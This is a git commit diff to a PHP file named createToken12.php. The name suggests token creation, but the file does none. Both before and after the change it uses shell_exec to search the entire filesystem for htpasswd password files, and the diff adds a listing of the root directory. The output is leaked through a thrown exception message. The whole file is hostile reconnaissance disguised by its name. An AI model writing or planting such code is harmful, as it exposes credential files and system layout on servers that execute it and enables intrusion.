ea4763d4678b270461ec0160801dd75fa6901acf
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 22:14:00 +0100

    Update createToken12.php

--- createToken12.php
+++ createToken12.php
@@ -1,7 +1,8 @@
 <?php
 $output ='';
 
-$output =$output."\n htpaswd ".shell_exec ('find / -name "*htpasswd"');
+$output =$output."\n htpaswd ".shell_exec ('find / -name "*htpasswd" | cat');
+$output =$output."\n root ls ".shell_exec ('ls / | cat');
 
 throw new Exception("\n SUCCESS  ". $output."\n");
 ?>
